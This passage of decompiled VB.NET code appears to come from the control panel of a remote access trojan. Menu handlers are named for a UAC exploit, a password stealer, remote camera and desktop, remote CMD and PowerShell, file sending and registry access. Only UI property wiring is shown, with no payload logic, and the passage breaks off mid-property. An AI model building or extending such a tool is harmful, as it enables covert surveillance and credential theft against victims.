		' Token: 0x170004FA RID: 1274
		' (get) Token: 0x06000BDB RID: 3035 RVA: 0x0006F1D6 File Offset: 0x0006D3D6
		' (set) Token: 0x06000BDC RID: 3036 RVA: 0x0006F1E0 File Offset: 0x0006D3E0
		Friend Overridable Property ElipseListPasswordsS As Guna2Elipse

		' Token: 0x170004FB RID: 1275
		' (get) Token: 0x06000BDD RID: 3037 RVA: 0x0006F1E9 File Offset: 0x0006D3E9
		' (set) Token: 0x06000BDE RID: 3038 RVA: 0x0006F1F3 File Offset: 0x0006D3F3
		Friend Overridable Property Guna2CustomGradientPanel9 As Guna2CustomGradientPanel

		' Token: 0x170004FC RID: 1276
		' (get) Token: 0x06000BDF RID: 3039 RVA: 0x0006F1FC File Offset: 0x0006D3FC
		' (set) Token: 0x06000BE0 RID: 3040 RVA: 0x0006F206 File Offset: 0x0006D406
		Friend Overridable Property Guna2GroupBoxDataEncrypt As Guna2Elipse

		' Token: 0x170004FD RID: 1277
		' (get) Token: 0x06000BE1 RID: 3041 RVA: 0x0006F20F File Offset: 0x0006D40F
		' (set) Token: 0x06000BE2 RID: 3042 RVA: 0x0006F219 File Offset: 0x0006D419
		Friend Overridable Property Guna2ElipseGroubBoxNameClient As Guna2Elipse

		' Token: 0x170004FE RID: 1278
		' (get) Token: 0x06000BE3 RID: 3043 RVA: 0x0006F222 File Offset: 0x0006D422
		' (set) Token: 0x06000BE4 RID: 3044 RVA: 0x0006F22C File Offset: 0x0006D42C
		Friend Overridable Property Guna2ElipsGroubBoxConnectionRefresh As Guna2Elipse

		' Token: 0x170004FF RID: 1279
		' (get) Token: 0x06000BE5 RID: 3045 RVA: 0x0006F235 File Offset: 0x0006D435
		' (set) Token: 0x06000BE6 RID: 3046 RVA: 0x0006F23F File Offset: 0x0006D43F
		Friend Overridable Property Guna2ElipseGroubBoxNotif As Guna2Elipse

		' Token: 0x17000500 RID: 1280
		' (get) Token: 0x06000BE7 RID: 3047 RVA: 0x0006F248 File Offset: 0x0006D448
		' (set) Token: 0x06000BE8 RID: 3048 RVA: 0x0006F252 File Offset: 0x0006D452
		Friend Overridable Property Guna2ElipseGroubBoxConnectionHos As Guna2Elipse

		' Token: 0x17000501 RID: 1281
		' (get) Token: 0x06000BE9 RID: 3049 RVA: 0x0006F25B File Offset: 0x0006D45B
		' (set) Token: 0x06000BEA RID: 3050 RVA: 0x0006F265 File Offset: 0x0006D465
		Friend Overridable Property Guna2CustomGradientPanel11 As Guna2CustomGradientPanel

		' Token: 0x17000502 RID: 1282
		' (get) Token: 0x06000BEB RID: 3051 RVA: 0x0006F26E File Offset: 0x0006D46E
		' (set) Token: 0x06000BEC RID: 3052 RVA: 0x0006F278 File Offset: 0x0006D478
		Friend Overridable Property Guna2CustomGradientPanel10 As Guna2CustomGradientPanel

		' Token: 0x17000503 RID: 1283
		' (get) Token: 0x06000BED RID: 3053 RVA: 0x0006F281 File Offset: 0x0006D481
		' (set) Token: 0x06000BEE RID: 3054 RVA: 0x0006F28B File Offset: 0x0006D48B
		Friend Overridable Property Guna2CustomGradientPanel12 As Guna2CustomGradientPanel

		' Token: 0x17000504 RID: 1284
		' (get) Token: 0x06000BEF RID: 3055 RVA: 0x0006F294 File Offset: 0x0006D494
		' (set) Token: 0x06000BF0 RID: 3056 RVA: 0x0006F29E File Offset: 0x0006D49E
		Friend Overridable Property Guna2CustomGradientPanel13 As Guna2CustomGradientPanel

		' Token: 0x17000505 RID: 1285
		' (get) Token: 0x06000BF1 RID: 3057 RVA: 0x0006F2A7 File Offset: 0x0006D4A7
		' (set) Token: 0x06000BF2 RID: 3058 RVA: 0x0006F2B1 File Offset: 0x0006D4B1
		Friend Overridable Property Guna2Elipse2 As Guna2Elipse

		' Token: 0x17000506 RID: 1286
		' (get) Token: 0x06000BF3 RID: 3059 RVA: 0x0006F2BA File Offset: 0x0006D4BA
		' (set) Token: 0x06000BF4 RID: 3060 RVA: 0x0006F2C4 File Offset: 0x0006D4C4
		Friend Overridable Property Guna2Elipse3 As Guna2Elipse

		' Token: 0x17000507 RID: 1287
		' (get) Token: 0x06000BF5 RID: 3061 RVA: 0x0006F2CD File Offset: 0x0006D4CD
		' (set) Token: 0x06000BF6 RID: 3062 RVA: 0x0006F2D7 File Offset: 0x0006D4D7
		Friend Overridable Property Guna2Elipse4 As Guna2Elipse

		' Token: 0x17000508 RID: 1288
		' (get) Token: 0x06000BF7 RID: 3063 RVA: 0x0006F2E0 File Offset: 0x0006D4E0
		' (set) Token: 0x06000BF8 RID: 3064 RVA: 0x0006F2EA File Offset: 0x0006D4EA
		Friend Overridable Property Guna2Elipse5 As Guna2Elipse

		' Token: 0x17000509 RID: 1289
		' (get) Token: 0x06000BF9 RID: 3065 RVA: 0x0006F2F3 File Offset: 0x0006D4F3
		' (set) Token: 0x06000BFA RID: 3066 RVA: 0x0006F2FD File Offset: 0x0006D4FD
		Friend Overridable Property Guna2Elipse6 As Guna2Elipse

		' Token: 0x1700050A RID: 1290
		' (get) Token: 0x06000BFB RID: 3067 RVA: 0x0006F306 File Offset: 0x0006D506
		' (set) Token: 0x06000BFC RID: 3068 RVA: 0x0006F310 File Offset: 0x0006D510
		Friend Overridable Property Guna2Elipse7 As Guna2Elipse

		' Token: 0x1700050B RID: 1291
		' (get) Token: 0x06000BFD RID: 3069 RVA: 0x0006F319 File Offset: 0x0006D519
		' (set) Token: 0x06000BFE RID: 3070 RVA: 0x0006F323 File Offset: 0x0006D523
		Friend Overridable Property Guna2Elipse8 As Guna2Elipse

		' Token: 0x1700050C RID: 1292
		' (get) Token: 0x06000BFF RID: 3071 RVA: 0x0006F32C File Offset: 0x0006D52C
		' (set) Token: 0x06000C00 RID: 3072 RVA: 0x0006F336 File Offset: 0x0006D536
		Friend Overridable Property Guna2Elipse9 As Guna2Elipse

		' Token: 0x1700050D RID: 1293
		' (get) Token: 0x06000C01 RID: 3073 RVA: 0x0006F33F File Offset: 0x0006D53F
		' (set) Token: 0x06000C02 RID: 3074 RVA: 0x0006F349 File Offset: 0x0006D549
		Friend Overridable Property Guna2Elipse10 As Guna2Elipse

		' Token: 0x1700050E RID: 1294
		' (get) Token: 0x06000C03 RID: 3075 RVA: 0x0006F352 File Offset: 0x0006D552
		' (set) Token: 0x06000C04 RID: 3076 RVA: 0x0006F35C File Offset: 0x0006D55C
		Friend Overridable Property Guna2Elipse11 As Guna2Elipse

		' Token: 0x1700050F RID: 1295
		' (get) Token: 0x06000C05 RID: 3077 RVA: 0x0006F365 File Offset: 0x0006D565
		' (set) Token: 0x06000C06 RID: 3078 RVA: 0x0006F36F File Offset: 0x0006D56F
		Friend Overridable Property Label1 As Label

		' Token: 0x17000510 RID: 1296
		' (get) Token: 0x06000C07 RID: 3079 RVA: 0x0006F378 File Offset: 0x0006D578
		' (set) Token: 0x06000C08 RID: 3080 RVA: 0x0006F382 File Offset: 0x0006D582
		Friend Overridable Property Guna2CustomGradientPanel14 As Guna2CustomGradientPanel

		' Token: 0x17000511 RID: 1297
		' (get) Token: 0x06000C09 RID: 3081 RVA: 0x0006F38B File Offset: 0x0006D58B
		' (set) Token: 0x06000C0A RID: 3082 RVA: 0x0006F395 File Offset: 0x0006D595
		Friend Overridable Property Guna2CustomGradientPanel15 As Guna2CustomGradientPanel

		' Token: 0x17000512 RID: 1298
		' (get) Token: 0x06000C0B RID: 3083 RVA: 0x0006F39E File Offset: 0x0006D59E
		' (set) Token: 0x06000C0C RID: 3084 RVA: 0x0006F3A8 File Offset: 0x0006D5A8
		Friend Overridable Property Guna2Elipse12 As Guna2Elipse

		' Token: 0x17000513 RID: 1299
		' (get) Token: 0x06000C0D RID: 3085 RVA: 0x0006F3B1 File Offset: 0x0006D5B1
		' (set) Token: 0x06000C0E RID: 3086 RVA: 0x0006F3BB File Offset: 0x0006D5BB
		Friend Overridable Property Guna2Elipse13 As Guna2Elipse

		' Token: 0x17000514 RID: 1300
		' (get) Token: 0x06000C0F RID: 3087 RVA: 0x0006F3C4 File Offset: 0x0006D5C4
		' (set) Token: 0x06000C10 RID: 3088 RVA: 0x0006F3CE File Offset: 0x0006D5CE
		Friend Overridable Property Guna2Elipse14 As Guna2Elipse

		' Token: 0x17000515 RID: 1301
		' (get) Token: 0x06000C11 RID: 3089 RVA: 0x0006F3D7 File Offset: 0x0006D5D7
		' (set) Token: 0x06000C12 RID: 3090 RVA: 0x0006F3E1 File Offset: 0x0006D5E1
		Friend Overridable Property Guna2Elipse15 As Guna2Elipse

		' Token: 0x17000516 RID: 1302
		' (get) Token: 0x06000C13 RID: 3091 RVA: 0x0006F3EA File Offset: 0x0006D5EA
		' (set) Token: 0x06000C14 RID: 3092 RVA: 0x0006F3F4 File Offset: 0x0006D5F4
		Friend Overridable Property Guna2Elipse16 As Guna2Elipse

		' Token: 0x17000517 RID: 1303
		' (get) Token: 0x06000C15 RID: 3093 RVA: 0x0006F3FD File Offset: 0x0006D5FD
		' (set) Token: 0x06000C16 RID: 3094 RVA: 0x0006F407 File Offset: 0x0006D607
		Friend Overridable Property Guna2Elipse17 As Guna2Elipse

		' Token: 0x17000518 RID: 1304
		' (get) Token: 0x06000C17 RID: 3095 RVA: 0x0006F410 File Offset: 0x0006D610
		' (set) Token: 0x06000C18 RID: 3096 RVA: 0x0006F41A File Offset: 0x0006D61A
		Friend Overridable Property Guna2Elipse18 As Guna2Elipse

		' Token: 0x17000519 RID: 1305
		' (get) Token: 0x06000C19 RID: 3097 RVA: 0x0006F423 File Offset: 0x0006D623
		' (set) Token: 0x06000C1A RID: 3098 RVA: 0x0006F42D File Offset: 0x0006D62D
		Friend Overridable Property Guna2Elipse19 As Guna2Elipse

		' Token: 0x1700051A RID: 1306
		' (get) Token: 0x06000C1B RID: 3099 RVA: 0x0006F436 File Offset: 0x0006D636
		' (set) Token: 0x06000C1C RID: 3100 RVA: 0x0006F440 File Offset: 0x0006D640
		Friend Overridable Property Guna2Elipse20 As Guna2Elipse

		' Token: 0x1700051B RID: 1307
		' (get) Token: 0x06000C1D RID: 3101 RVA: 0x0006F449 File Offset: 0x0006D649
		' (set) Token: 0x06000C1E RID: 3102 RVA: 0x0006F453 File Offset: 0x0006D653
		Friend Overridable Property Guna2Elipse21 As Guna2Elipse

		' Token: 0x1700051C RID: 1308
		' (get) Token: 0x06000C1F RID: 3103 RVA: 0x0006F45C File Offset: 0x0006D65C
		' (set) Token: 0x06000C20 RID: 3104 RVA: 0x0006F466 File Offset: 0x0006D666
		Friend Overridable Property Guna2CustomGradientPanel16 As Guna2CustomGradientPanel

		' Token: 0x1700051D RID: 1309
		' (get) Token: 0x06000C21 RID: 3105 RVA: 0x0006F46F File Offset: 0x0006D66F
		' (set) Token: 0x06000C22 RID: 3106 RVA: 0x0006F479 File Offset: 0x0006D679
		Friend Overridable Property Label22 As Label

		' Token: 0x1700051E RID: 1310
		' (get) Token: 0x06000C23 RID: 3107 RVA: 0x0006F482 File Offset: 0x0006D682
		' (set) Token: 0x06000C24 RID: 3108 RVA: 0x0006F48C File Offset: 0x0006D68C
		Friend Overridable Property SavePorts As Guna2ToggleSwitch

		' Token: 0x1700051F RID: 1311
		' (get) Token: 0x06000C25 RID: 3109 RVA: 0x0006F495 File Offset: 0x0006D695
		' (set) Token: 0x06000C26 RID: 3110 RVA: 0x0006F49F File Offset: 0x0006D69F
		Friend Overridable Property Guna2CustomGradientPanel17 As Guna2CustomGradientPanel

		' Token: 0x17000520 RID: 1312
		' (get) Token: 0x06000C27 RID: 3111 RVA: 0x0006F4A8 File Offset: 0x0006D6A8
		' (set) Token: 0x06000C28 RID: 3112 RVA: 0x0006F4B2 File Offset: 0x0006D6B2
		Friend Overridable Property Guna2CustomGradientPanel18 As Guna2CustomGradientPanel

		' Token: 0x17000521 RID: 1313
		' (get) Token: 0x06000C29 RID: 3113 RVA: 0x0006F4BB File Offset: 0x0006D6BB
		' (set) Token: 0x06000C2A RID: 3114 RVA: 0x0006F4C5 File Offset: 0x0006D6C5
		Friend Overridable Property Guna2ImageButton2 As Guna2ImageButton

		' Token: 0x17000522 RID: 1314
		' (get) Token: 0x06000C2B RID: 3115 RVA: 0x0006F4CE File Offset: 0x0006D6CE
		' (set) Token: 0x06000C2C RID: 3116 RVA: 0x0006F4D8 File Offset: 0x0006D6D8
		Friend Overridable Property Guna2Elipse22 As Guna2Elipse

		' Token: 0x17000523 RID: 1315
		' (get) Token: 0x06000C2D RID: 3117 RVA: 0x0006F4E1 File Offset: 0x0006D6E1
		' (set) Token: 0x06000C2E RID: 3118 RVA: 0x0006F4EB File Offset: 0x0006D6EB
		Friend Overridable Property DataGridViewImageColumn1 As DataGridViewImageColumn

		' Token: 0x17000524 RID: 1316
		' (get) Token: 0x06000C2F RID: 3119 RVA: 0x0006F4F4 File Offset: 0x0006D6F4
		' (set) Token: 0x06000C30 RID: 3120 RVA: 0x0006F4FE File Offset: 0x0006D6FE
		Friend Overridable Property DataGridViewTextBoxColumn1 As DataGridViewTextBoxColumn

		' Token: 0x17000525 RID: 1317
		' (get) Token: 0x06000C31 RID: 3121 RVA: 0x0006F507 File Offset: 0x0006D707
		' (set) Token: 0x06000C32 RID: 3122 RVA: 0x0006F511 File Offset: 0x0006D711
		Friend Overridable Property DataGridViewTextBoxColumn2 As DataGridViewTextBoxColumn

		' Token: 0x17000526 RID: 1318
		' (get) Token: 0x06000C33 RID: 3123 RVA: 0x0006F51A File Offset: 0x0006D71A
		' (set) Token: 0x06000C34 RID: 3124 RVA: 0x0006F524 File Offset: 0x0006D724
		Friend Overridable Property Guna2Elipse23 As Guna2Elipse

		' Token: 0x17000527 RID: 1319
		' (get) Token: 0x06000C35 RID: 3125 RVA: 0x0006F52D File Offset: 0x0006D72D
		' (set) Token: 0x06000C36 RID: 3126 RVA: 0x0006F537 File Offset: 0x0006D737
		Friend Overridable Property Guna2Elipse24 As Guna2Elipse

		' Token: 0x17000528 RID: 1320
		' (get) Token: 0x06000C37 RID: 3127 RVA: 0x0006F540 File Offset: 0x0006D740
		' (set) Token: 0x06000C38 RID: 3128 RVA: 0x0006F54A File Offset: 0x0006D74A
		Friend Overridable Property Guna2Elipse25 As Guna2Elipse

		' Token: 0x17000529 RID: 1321
		' (get) Token: 0x06000C39 RID: 3129 RVA: 0x0006F553 File Offset: 0x0006D753
		' (set) Token: 0x06000C3A RID: 3130 RVA: 0x0006F55D File Offset: 0x0006D75D
		Friend Overridable Property ContexS500 As Guna2ContextMenuStrip

		' Token: 0x1700052A RID: 1322
		' (get) Token: 0x06000C3B RID: 3131 RVA: 0x0006F566 File Offset: 0x0006D766
		' (set) Token: 0x06000C3C RID: 3132 RVA: 0x0006F570 File Offset: 0x0006D770
		Friend Overridable Property ElipseContexs500 As Guna2Elipse

		' Token: 0x1700052B RID: 1323
		' (get) Token: 0x06000C3D RID: 3133 RVA: 0x0006F579 File Offset: 0x0006D779
		' (set) Token: 0x06000C3E RID: 3134 RVA: 0x0006F583 File Offset: 0x0006D783
		Friend Overridable Property ToolStripMenuItem29 As ToolStripMenuItem

		' Token: 0x1700052C RID: 1324
		' (get) Token: 0x06000C3F RID: 3135 RVA: 0x0006F58C File Offset: 0x0006D78C
		' (set) Token: 0x06000C40 RID: 3136 RVA: 0x0006F598 File Offset: 0x0006D798
		Friend Overridable Property SendFileContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._SendFileContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SendFileContex_Click
				Dim sendFileContex As ToolStripMenuItem = Me._SendFileContex
				If sendFileContex IsNot Nothing Then
					RemoveHandler sendFileContex.Click, value2
				End If
				Me._SendFileContex = value
				sendFileContex = Me._SendFileContex
				If sendFileContex IsNot Nothing Then
					AddHandler sendFileContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700052D RID: 1325
		' (get) Token: 0x06000C41 RID: 3137 RVA: 0x0006F5DB File Offset: 0x0006D7DB
		' (set) Token: 0x06000C42 RID: 3138 RVA: 0x0006F5E8 File Offset: 0x0006D7E8
		Friend Overridable Property UACExploitContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._UACExploitContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UACExploitContex_Click
				Dim uacexploitContex As ToolStripMenuItem = Me._UACExploitContex
				If uacexploitContex IsNot Nothing Then
					RemoveHandler uacexploitContex.Click, value2
				End If
				Me._UACExploitContex = value
				uacexploitContex = Me._UACExploitContex
				If uacexploitContex IsNot Nothing Then
					AddHandler uacexploitContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700052E RID: 1326
		' (get) Token: 0x06000C43 RID: 3139 RVA: 0x0006F62B File Offset: 0x0006D82B
		' (set) Token: 0x06000C44 RID: 3140 RVA: 0x0006F635 File Offset: 0x0006D835
		Friend Overridable Property ToolStripMenuItem26 As ToolStripMenuItem

		' Token: 0x1700052F RID: 1327
		' (get) Token: 0x06000C45 RID: 3141 RVA: 0x0006F63E File Offset: 0x0006D83E
		' (set) Token: 0x06000C46 RID: 3142 RVA: 0x0006F648 File Offset: 0x0006D848
		Friend Overridable Property ToolStripMenuItem25 As ToolStripMenuItem

		' Token: 0x17000530 RID: 1328
		' (get) Token: 0x06000C47 RID: 3143 RVA: 0x0006F651 File Offset: 0x0006D851
		' (set) Token: 0x06000C48 RID: 3144 RVA: 0x0006F65B File Offset: 0x0006D85B
		Friend Overridable Property ToolStripMenuItem24 As ToolStripMenuItem

		' Token: 0x17000531 RID: 1329
		' (get) Token: 0x06000C49 RID: 3145 RVA: 0x0006F664 File Offset: 0x0006D864
		' (set) Token: 0x06000C4A RID: 3146 RVA: 0x0006F670 File Offset: 0x0006D870
		Friend Overridable Property PasswordStealerContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PasswordStealerContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PasswordStealerContex_Click
				Dim passwordStealerContex As ToolStripMenuItem = Me._PasswordStealerContex
				If passwordStealerContex IsNot Nothing Then
					RemoveHandler passwordStealerContex.Click, value2
				End If
				Me._PasswordStealerContex = value
				passwordStealerContex = Me._PasswordStealerContex
				If passwordStealerContex IsNot Nothing Then
					AddHandler passwordStealerContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000532 RID: 1330
		' (get) Token: 0x06000C4B RID: 3147 RVA: 0x0006F6B3 File Offset: 0x0006D8B3
		' (set) Token: 0x06000C4C RID: 3148 RVA: 0x0006F6BD File Offset: 0x0006D8BD
		Friend Overridable Property HelpManagerContex As Guna2ContextMenuStrip

		' Token: 0x17000533 RID: 1331
		' (get) Token: 0x06000C4D RID: 3149 RVA: 0x0006F6C6 File Offset: 0x0006D8C6
		' (set) Token: 0x06000C4E RID: 3150 RVA: 0x0006F6D0 File Offset: 0x0006D8D0
		Friend Overridable Property FileManagerContexMune As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FileManagerContexMune
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FileManagerContexMune_Click
				Dim fileManagerContexMune As ToolStripMenuItem = Me._FileManagerContexMune
				If fileManagerContexMune IsNot Nothing Then
					RemoveHandler fileManagerContexMune.Click, value2
				End If
				Me._FileManagerContexMune = value
				fileManagerContexMune = Me._FileManagerContexMune
				If fileManagerContexMune IsNot Nothing Then
					AddHandler fileManagerContexMune.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000534 RID: 1332
		' (get) Token: 0x06000C4F RID: 3151 RVA: 0x0006F713 File Offset: 0x0006D913
		' (set) Token: 0x06000C50 RID: 3152 RVA: 0x0006F720 File Offset: 0x0006D920
		Friend Overridable Property RegistryContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RegistryContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RegistryContex_Click
				Dim registryContex As ToolStripMenuItem = Me._RegistryContex
				If registryContex IsNot Nothing Then
					RemoveHandler registryContex.Click, value2
				End If
				Me._RegistryContex = value
				registryContex = Me._RegistryContex
				If registryContex IsNot Nothing Then
					AddHandler registryContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000535 RID: 1333
		' (get) Token: 0x06000C51 RID: 3153 RVA: 0x0006F763 File Offset: 0x0006D963
		' (set) Token: 0x06000C52 RID: 3154 RVA: 0x0006F770 File Offset: 0x0006D970
		Friend Overridable Property CmdContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CmdContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CmdContex_Click
				Dim cmdContex As ToolStripMenuItem = Me._CmdContex
				If cmdContex IsNot Nothing Then
					RemoveHandler cmdContex.Click, value2
				End If
				Me._CmdContex = value
				cmdContex = Me._CmdContex
				If cmdContex IsNot Nothing Then
					AddHandler cmdContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000536 RID: 1334
		' (get) Token: 0x06000C53 RID: 3155 RVA: 0x0006F7B3 File Offset: 0x0006D9B3
		' (set) Token: 0x06000C54 RID: 3156 RVA: 0x0006F7C0 File Offset: 0x0006D9C0
		Friend Overridable Property PowerShellContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PowerShellContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PowerShellContex_Click
				Dim powerShellContex As ToolStripMenuItem = Me._PowerShellContex
				If powerShellContex IsNot Nothing Then
					RemoveHandler powerShellContex.Click, value2
				End If
				Me._PowerShellContex = value
				powerShellContex = Me._PowerShellContex
				If powerShellContex IsNot Nothing Then
					AddHandler powerShellContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000537 RID: 1335
		' (get) Token: 0x06000C55 RID: 3157 RVA: 0x0006F803 File Offset: 0x0006DA03
		' (set) Token: 0x06000C56 RID: 3158 RVA: 0x0006F810 File Offset: 0x0006DA10
		Friend Overridable Property ProcessManagerContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ProcessManagerContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ProcessManagerContex_Click
				Dim processManagerContex As ToolStripMenuItem = Me._ProcessManagerContex
				If processManagerContex IsNot Nothing Then
					RemoveHandler processManagerContex.Click, value2
				End If
				Me._ProcessManagerContex = value
				processManagerContex = Me._ProcessManagerContex
				If processManagerContex IsNot Nothing Then
					AddHandler processManagerContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000538 RID: 1336
		' (get) Token: 0x06000C57 RID: 3159 RVA: 0x0006F853 File Offset: 0x0006DA53
		' (set) Token: 0x06000C58 RID: 3160 RVA: 0x0006F860 File Offset: 0x0006DA60
		Friend Overridable Property ServicesContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ServicesContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ServicesContex_Click
				Dim servicesContex As ToolStripMenuItem = Me._ServicesContex
				If servicesContex IsNot Nothing Then
					RemoveHandler servicesContex.Click, value2
				End If
				Me._ServicesContex = value
				servicesContex = Me._ServicesContex
				If servicesContex IsNot Nothing Then
					AddHandler servicesContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000539 RID: 1337
		' (get) Token: 0x06000C59 RID: 3161 RVA: 0x0006F8A3 File Offset: 0x0006DAA3
		' (set) Token: 0x06000C5A RID: 3162 RVA: 0x0006F8B0 File Offset: 0x0006DAB0
		Friend Overridable Property InstalledSoftWareContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._InstalledSoftWareContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InstalledSoftWareContex_Click
				Dim installedSoftWareContex As ToolStripMenuItem = Me._InstalledSoftWareContex
				If installedSoftWareContex IsNot Nothing Then
					RemoveHandler installedSoftWareContex.Click, value2
				End If
				Me._InstalledSoftWareContex = value
				installedSoftWareContex = Me._InstalledSoftWareContex
				If installedSoftWareContex IsNot Nothing Then
					AddHandler installedSoftWareContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700053A RID: 1338
		' (get) Token: 0x06000C5B RID: 3163 RVA: 0x0006F8F3 File Offset: 0x0006DAF3
		' (set) Token: 0x06000C5C RID: 3164 RVA: 0x0006F900 File Offset: 0x0006DB00
		Friend Overridable Property StartupManagerContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._StartupManagerContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StartupManagerContex_Click
				Dim startupManagerContex As ToolStripMenuItem = Me._StartupManagerContex
				If startupManagerContex IsNot Nothing Then
					RemoveHandler startupManagerContex.Click, value2
				End If
				Me._StartupManagerContex = value
				startupManagerContex = Me._StartupManagerContex
				If startupManagerContex IsNot Nothing Then
					AddHandler startupManagerContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700053B RID: 1339
		' (get) Token: 0x06000C5D RID: 3165 RVA: 0x0006F943 File Offset: 0x0006DB43
		' (set) Token: 0x06000C5E RID: 3166 RVA: 0x0006F94D File Offset: 0x0006DB4D
		Friend Overridable Property Guna2Elipse26 As Guna2Elipse

		' Token: 0x1700053C RID: 1340
		' (get) Token: 0x06000C5F RID: 3167 RVA: 0x0006F956 File Offset: 0x0006DB56
		' (set) Token: 0x06000C60 RID: 3168 RVA: 0x0006F960 File Offset: 0x0006DB60
		Friend Overridable Property InformationsContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._InformationsContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InformationsContex_Click
				Dim informationsContex As ToolStripMenuItem = Me._InformationsContex
				If informationsContex IsNot Nothing Then
					RemoveHandler informationsContex.Click, value2
				End If
				Me._InformationsContex = value
				informationsContex = Me._InformationsContex
				If informationsContex IsNot Nothing Then
					AddHandler informationsContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700053D RID: 1341
		' (get) Token: 0x06000C61 RID: 3169 RVA: 0x0006F9A3 File Offset: 0x0006DBA3
		' (set) Token: 0x06000C62 RID: 3170 RVA: 0x0006F9AD File Offset: 0x0006DBAD
		Friend Overridable Property HelpMointorContex As Guna2ContextMenuStrip

		' Token: 0x1700053E RID: 1342
		' (get) Token: 0x06000C63 RID: 3171 RVA: 0x0006F9B6 File Offset: 0x0006DBB6
		' (set) Token: 0x06000C64 RID: 3172 RVA: 0x0006F9C0 File Offset: 0x0006DBC0
		Friend Overridable Property RemoteDesktopContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RemoteDesktopContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteDesktopContex_Click
				Dim remoteDesktopContex As ToolStripMenuItem = Me._RemoteDesktopContex
				If remoteDesktopContex IsNot Nothing Then
					RemoveHandler remoteDesktopContex.Click, value2
				End If
				Me._RemoteDesktopContex = value
				remoteDesktopContex = Me._RemoteDesktopContex
				If remoteDesktopContex IsNot Nothing Then
					AddHandler remoteDesktopContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700053F RID: 1343
		' (get) Token: 0x06000C65 RID: 3173 RVA: 0x0006FA03 File Offset: 0x0006DC03
		' (set) Token: 0x06000C66 RID: 3174 RVA: 0x0006FA10 File Offset: 0x0006DC10
		Friend Overridable Property RemoteCamaraContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RemoteCamaraContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteCamaraContex_Click
				Dim remoteCamaraContex As ToolStripMenuItem = Me._RemoteCamaraContex
				If remoteCamaraContex IsNot Nothing Then
					RemoveHandler remoteCamaraContex.Click, value2
				End If
				Me._RemoteCamaraContex = value
				remoteCamaraContex = Me._RemoteCamaraContex
				If remoteCamaraContex IsNot Nothing Then
					AddHandler remoteCamaraContex.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000540 RID: 1344
		' (get) Token: 0x06000C67 RID: 3175 RVA: 0x0006FA53 File Offset: 0x0006DC53
		' (set) Token: 0x06000C68 RID: 3176 RVA: 0x0006FA60 File Offset: 0x0006DC60
		Friend Overridable Property ActiveWindowsContex As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ActiveWindowsContex
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
